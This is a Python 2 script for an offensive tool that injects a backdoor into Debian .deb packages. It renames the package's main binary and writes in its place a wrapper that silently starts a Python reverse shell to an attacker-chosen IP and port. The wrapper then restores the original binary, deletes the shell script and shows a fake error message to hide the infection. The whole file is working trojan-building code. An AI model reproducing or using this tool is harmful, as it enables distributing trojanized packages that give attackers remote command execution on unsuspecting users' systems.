import os	
import sys
import commands
from time import sleep

#Module Of Deb_Infection
def debinject():
    deb_enter = raw_input("Deb file: ")
    print "Extraction files...."
    os.system("dpkg-deb --extract "+deb_enter+" path")
    sleep(0.2)
    print "Extraction control config files.."
    os.system("dpkg-deb --control "+deb_enter+" path/DEBIAN")
    sleep(0.2)
    pasta_local = os.getcwd()
    files = commands.getoutput("ls "+pasta_local+"/path/usr")
    infect = commands.getoutput("cat "+pasta_local+"/path/DEBIAN/control | awk '$1 == \"Package:\" {print $2}'")
    if 'sbin' in files:
        print "[+] Found Sbin [+]"
        sleep(0.2)
        old_file = pasta_local + '/' + "path/usr/sbin/" + infect + "1"
        new_file = pasta_local + '/' + "path/usr/sbin/" + infect
        os.system("mv " + new_file + " " + old_file)
        ip = raw_input("ip: ")
        port = raw_input("port: ")
        file = open(pasta_local + "/path/usr/sbin/script.py","w") 
        file.write("import socket,os\n")
        file.write("so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n")
        file.write("so.connect(('"+ip+"',"+port+"))\n")
        file.write("WO=False\n")
        file.write("while not WO:\n")
        file.write("	data=so.recv(1024)\n")
        file.write("	if len(data)==0:\n")
        file.write("		WO=True\n")
        file.write("	stdin,stdout,stderr,=os.popen3(data)\n")
        file.write("	stdout_value=stdout.read()+stderr.read()\n")
        file.write("	so.send(stdout_value)\n")
        file.close()
        print "Backdoor Created with sucess"
        file = open(pasta_local + "/path/usr/sbin/"+infect+"","w") 
        file.write("#/usr/bin/bash\n")
        file.write("\n")
        file.write("nohup python /usr/sbin/script.py &>/dev/null &")
        file.write("sleep 0.1\n")
        file.write("rm -rf /usr/sbin/"+infect+"\n")
        file.write("sleep 0.1\n")
        file.write("mv /usr/sbin/"+infect+"1 /usr/sbin/"+infect+"\n")
        file.write("sleep 0.1\n")
        file.write("rm -rf /usr/sbin/script.py\n")
        file.write("echo \"Error, please, execute again\"\n")
        file.close()
        print "Deb Backdored With Sucess"
        sleep(0.2)
        os.system("chmod 777 "+new_file+"")
        deb_final = raw_input("Name of new deb: ")
        os.system("dpkg-deb --build path "+deb_final+"")
        print "Removing Tempory Directory"
        os.system("rm -rf path")
        print "ORIGINAL DEB ==> " + deb_enter
        print "INFECT DEB ==> " + deb_final
    elif 'bin' in files:
        print "[+] Found bin [+]"
        sleep(0.2)
        old_file = pasta_local + '/' + "path/usr/bin/" + infect + "1"
        new_file = pasta_local + '/' + "path/usr/bin/" + infect
        os.system("mv " + new_file + " " + old_file)
        ip = raw_input("ip: ")
        port = raw_input("port: ")        
        file = open(pasta_local + "/path/usr/bin/script.py","w") 
        file.write("import socket,os\n")
        file.write("so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n")
        file.write("so.connect(('"+ip+"',"+port+"))\n")
        file.write("WO=False\n")
        file.write("while not WO:\n")
        file.write("	data=so.recv(1024)\n")
        file.write("	if len(data)==0:\n")
        file.write("		WO=True\n")
        file.write("	stdin,stdout,stderr,=os.popen3(data)\n")
        file.write("	stdout_value=stdout.read()+stderr.read()\n")
        file.write("	so.send(stdout_value)\n")
        file.close()
        print "Backdoor Created with sucess"
        file = open(pasta_local + "/path/usr/bin/"+infect+"","w") 
        file.write("#/usr/bin/bash\n")
        file.write("\n")
        file.write("nohup python /usr/bin/script.py &>/dev/null &\n")
        file.write("sleep 0.1\n")
        file.write("rm -rf /usr/bin/"+infect+"\n")
        file.write("sleep 0.1\n")
        file.write("mv /usr/bin/"+infect+"1 /usr/bin/"+infect+"\n")
        file.write("sleep 0.1\n")
        file.write("rm -rf /usr/bin/script.py\n")
        file.write("echo \"Error, please, execute again\"\n")
        file.close()
        print "Deb Backdored With Sucess"
        sleep(0.2)
        os.system("chmod 777 "+new_file+"")
        deb_final = raw_input("Name of new deb: ")
        os.system("dpkg-deb --build path "+deb_final+"")
        print "Removing Tempory Directory"
        os.system("rm -rf path")
        print "ORIGINAL DEB ==> " + deb_enter
        print "INFECT DEB ==> " + deb_final

#Effect of Typper Writer
def typing(a):
    words = a + "\n"
    for char in words:
        sleep(0.1)
        sys.stdout.write(char)
        sys.stdout.flush()
